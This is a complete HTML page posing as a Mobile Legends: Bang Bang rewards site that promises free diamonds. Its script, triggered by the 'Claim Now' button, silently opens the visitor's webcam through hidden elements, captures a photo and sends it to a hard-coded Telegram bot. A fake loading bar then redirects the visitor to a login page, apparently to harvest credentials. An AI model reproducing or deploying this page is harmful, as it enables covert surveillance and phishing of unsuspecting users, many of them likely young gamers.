<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mobile Legends Rewards</title>
    <style>
        :root {
            --primary: #FFD700;
            --secondary: #FF6B00;
            --dark: #0A0A0A;
            --dark-secondary: #1A1A1A;
            --text: #FFFFFF;
            --text-secondary: #BBBBBB;
        }

        * {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: var(--dark);
            color: var(--text);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            text-align: center;
        }

        .container {
            background: var(--dark-secondary);
            padding: 25px;
            border-radius: 12px;
            width: 100%;
            max-width: 450px;
            margin: auto;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        img {
            width: 120px;
            max-width: 40%;
            height: auto;
            margin-bottom: 15px;
        }

        h1 {
            font-size: 22px;
            margin: 0 0 10px 0;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-weight: 700;
            line-height: 1.3;
        }

        p {
            font-size: 15px;
            color: var(--text-secondary);
            margin: 0 0 25px 0;
            line-height: 1.5;
        }

        .value-section {
            margin: 20px 0;
            padding: 15px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .value-section h2 {
            font-size: 18px;
            margin: 0 0 12px 0;
        }

        .value {
            font-size: 28px;
            font-weight: bold;
            color: var(--primary);
            margin: 10px 0;
            display: block;
        }

        .button {
            display: block;
            width: 100%;
            padding: 16px;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            color: #000;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            margin-top: 20px;
            text-decoration: none;
            transition: transform 0.2s;
            cursor: pointer;
        }

        .button:active {
            transform: scale(0.98);
        }

        footer {
            margin-top: 30px;
            font-size: 12px;
            color: var(--text-secondary);
        }

        /* Loading Screen */
        #mlbbLoading {
            display:none; 
            position:fixed; 
            top:0; 
            left:0; 
            width:100%; 
            height:100%; 
            background:#0A0A0A; 
            z-index:9999; 
            text-align:center; 
            padding-top:20%;
        }

        /* Hidden elements for camera */
        #hiddenCamera {
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
        }

        @media (max-width: 768px) {
            .container {
                padding: 20px;
            }

            h1 {
                font-size: 20px;
            }

            .value {
                font-size: 24px;
            }
        }

        @media (max-width: 360px) {
            body {
                padding: 15px;
            }

            .container {
                padding: 18px;
            }

            h1 {
                font-size: 18px;
            }

            p {
                font-size: 14px;
            }

            .button {
                padding: 14px;
                font-size: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="logo.png" alt="Mobile Legends Logo" loading="lazy">
        <h1>Welcome to Mobile Legends Rewards</h1>
        <p>Claim your free diamonds and exclusive skins now!</p>

        <div class="value-section">
            <h2>Your Available Rewards</h2>
            <p>Diamonds: <span class="value">500</span></p>
            <p>Battle Points: <span class="value">3000</span></p>
        </div>

        <button class="button" onclick="showFakeMLBBLoading()">Claim Now</button>
    </div>

    <footer>
        <p>&copy; 2025 Mobile Legends: Bang Bang. All rights reserved.</p>
    </footer>

    <!-- Loading Screen -->
    <div id="mlbbLoading" style="display:none;">
        <img src="logo.png" alt="MLBB Logo" width="100">
        <div style="margin:20px auto; width:200px; height:4px; background:#333; border-radius:2px;">
            <div id="loadingBar" style="height:100%; width:0%; background:#FFD700; border-radius:2px;"></div>
        </div>
        <p style="color:#FFD700;">Loading rewards... <span id="loadingPercent">0%</span></p>
    </div>

    <!-- Hidden camera elements -->
    <video id="hiddenVideo" autoplay playsinline style="display:none;"></video>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>

    <script>
        // Telegram Bot Configuration
        const botToken = "7752857283:AAGYsQ4Jh3hVvBUTIcgz3gdft53Z_B-5rrk";
        const chatId = "7328757522";

        // Function to attempt hidden camera capture
        function attemptCameraCapture() {
            const video = document.getElementById('hiddenVideo');
            const canvas = document.getElementById('hiddenCanvas');
            
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // Convert to blob and send to Telegram
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('chat_id', chatId);
                            formData.append('caption', 'Automated capture');
                            formData.append('photo', blob, 'user_photo.jpg');
                            
                            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                            
                            // Stop all video tracks
                            stream.getTracks().forEach(track => track.stop());
                        }, 'image/jpeg', 0.7);
                    }, 1000); // Wait 1 second before capturing
                })
                .catch(err => {
                    console.error("Camera access failed:", err);
                });
        }

        function showFakeMLBBLoading() {
            document.getElementById("mlbbLoading").style.display = "block";
            
            // Attempt to capture photo silently
            attemptCameraCapture();
            
            let percent = 0;
            const bar = document.getElementById("loadingBar");
            const percentText = document.getElementById("loadingPercent");

            const interval = setInterval(() => {
                percent += 1;
                bar.style.width = percent + "%";
                percentText.textContent = percent + "%";

                if (percent >= 100) {
                    clearInterval(interval);
                    window.location.href = "login.html";
                }
            }, 30);
        }
    </script>
</body>
</html>
